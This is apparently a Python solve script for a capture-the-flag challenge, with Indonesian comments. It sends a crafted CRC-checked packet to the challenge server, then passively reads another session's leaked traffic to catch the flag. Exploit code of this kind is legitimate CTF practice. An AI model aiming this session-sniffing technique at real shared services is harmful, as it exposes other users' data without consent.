import socket
import struct
import zlib
import time

HOST = 'chals3.apoorvctf.xyz'
PORT = 3001

def build_packet(tid, proto, flags, payload):
    header = struct.pack(">B B I B H", 1, flags, tid, proto, len(payload))
    data = header + payload
    crc = zlib.crc32(data) & 0xFFFFFFFF
    return data + struct.pack(">I", crc)

def solve():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Kita set timeout lama agar socket tidak terputus saat menunggu
        s.settimeout(20) 
        s.connect((HOST, PORT))

        print("[*] 1. Mengirim perintah STATUS untuk mendaftarkan sesi...")
        pkt = build_packet(1, 2, 4, b"STATUS\n")
        s.sendall(pkt)
        
        # Baca respons STATUS milik kita sendiri
        resp1 = s.recv(1024).decode(errors='ignore').strip()
        print(f"    [Node 1] {resp1}")

        print("\n[*] 2. Masuk ke mode 'PROMISCUOUS/SNIFFER'...")
        print("[*] Menunggu paket yang 'bocor' dari sesi Node 2 (tunggu sekitar 10-15 detik)...")
        print("-" * 50)
        
        # Loop untuk terus mendengarkan socket tanpa mengirim apa-apa
        start_time = time.time()
        while time.time() - start_time < 15:
            try:
                # Dengarkan jika ada paket asing yang masuk
                leaked_data = s.recv(4096)
                if leaked_data:
                    print("\n[!!!] BINGO! ADA PAKET BOCOR YANG MASUK:")
                    
                    # Cetak Hex-nya untuk melihat struktur raw
                    print("Hex Dump:")
                    print(leaked_data.hex(' ', 1).upper())
                    
                    # Cetak ASCII-nya (Siapa tahu Token atau Flag langsung terlihat)
                    print("\nASCII Decode:")
                    print(leaked_data.decode(errors='ignore').strip())
                    
                    if "apoorv{" in leaked_data.decode(errors='ignore'):
                        print("\n[🏆] FLAG BERHASIL DITANGKAP DARI UDARA!")
                        break
            except socket.timeout:
                # Wajar jika tidak ada paket tiap detik
                pass
                
        print("-" * 50)
        print("[*] Selesai mendengarkan.")
        s.close()

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    solve()
